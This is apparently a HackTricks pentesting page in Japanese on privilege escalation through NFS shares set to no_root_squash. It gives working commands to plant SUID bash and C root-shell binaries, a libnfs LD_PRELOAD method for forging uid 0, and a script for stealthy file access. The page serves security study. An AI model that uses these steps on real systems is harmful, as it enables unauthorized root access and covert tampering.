# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashingの基本情報

NFSは通常（特にlinuxでは）、接続してファイルにアクセスするclientが指定した`uid`と`gid`を信頼します（kerberosが使用されていない場合）。ただし、server側でこの**動作を変更する**ために、いくつかの設定を行えます。

- **`all_squash`**: すべてのアクセスをsquashし、すべてのuserとgroupを**`nobody`**（符号なし65534 / 符号付き-2）にマッピングします。したがって、全員が`nobody`となり、userは使用されません。
- **`root_squash`/`no_all_squash`**: これはLinuxのdefaultで、**uid 0（root）によるアクセスのみ**をsquashします。したがって、任意の`UID`と`GID`は信頼されますが、`0`は`nobody`にsquashされます（そのためrootのimpersonationは不可能です）。
- **`no_root_squash`**: この設定を有効にすると、root userさえsquashされません。つまり、この設定が適用されたdirectoryをmountすると、rootとしてアクセスできます。

**/etc/exports** fileで、**no_root_squash**として設定されたdirectoryを見つけた場合、clientとしてそのdirectoryに**アクセス**し、マシンのlocal **root**であるかのようにそのdirectory内に**書き込む**ことができます。

**NFS**の詳細については、以下を確認してください。


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bashを使用するOption 1:
- client machineでそのdirectoryを**mount**し、rootとしてmountしたfolder内に**/bin/bash** binaryをcopyして**SUID**権限を付与し、victim machine上でそのbash binaryを**実行**します。
- NFS share内でrootになるには、serverで**`no_root_squash`**が設定されている必要があります。
- ただし、有効になっていない場合でも、binaryをNFS shareにcopyし、Privilege Escalationの対象にしたいuserとしてSUID permissionを付与することで、別のuserにPrivilege Escalationできます。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2：c compiled code を使用：
- **その directory を mount** している client machine 上で、**root として mount された folder 内に、SUID permission を悪用するコンパイル済み payload を copy** し、それに **SUID** rights を付与して、victim machine からその binary を **execute** する（ここに[C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)があります）。
- これまでと同じ restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> **マシンから victim machine への tunnel を作成できる場合、必要な port を tunnelling することで、Remote version を使用してこの privilege escalation を exploit できる**ことに注意してください。\
> 以下の trick は、ファイル `/etc/exports` が **IP** を示している場合に使用します。この場合、いかなる方法でも **remote exploit を使用できず**、この **trick を abuse** する必要があります。\
> exploit を動作させるために必要なもう1つの条件は、**`/etc/export` 内の export が** **`insecure` flag を使用していること**です。\
> --_`/etc/export` が IP address を示している場合に、この trick が動作するかどうかは確信がありません_--

### Basic Information

この scenario では、local machine に mount された NFS share を exploit します。NFSv3 specification の flaw を利用すると、client が自身の uid/gid を指定できるため、不正な access が可能になる場合があります。exploit では、NFS RPC calls の forging を可能にする library である [libnfs](https://github.com/sahlberg/libnfs) を使用します。

#### Compiling the Library

library の compilation steps は、kernel version に応じて調整が必要になる場合があります。この specific case では、fallocate syscalls が comment out されました。compilation process では、以下の commands を実行します。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploitの実行

このexploitでは、rootへ権限昇格してからshellを実行するシンプルなCプログラム（`pwn.c`）を作成します。プログラムをコンパイルし、`ld_nfs.so`を使用してRPC呼び出し内のuidを偽装し、生成されたバイナリ（`a.out`）をsuid root付きでshare上に配置します。

1. **exploitコードをコンパイルする:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **uidを偽装してexploitをshareに配置し、権限を変更する：**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root 権限を取得するために exploit を実行する:**
```bash
/mnt/share/a.out
#root
```
### Bonus: ステルスなファイルアクセスのための NFShell

root access を取得したら、痕跡を残さないように ownership を変更せず NFS share とやり取りするため、Python script（nfsh.py）を使用します。この script はアクセス対象の file に合わせて uid を調整し、permission の問題なく share 上の file を操作できるようにします：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
次のように実行します:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
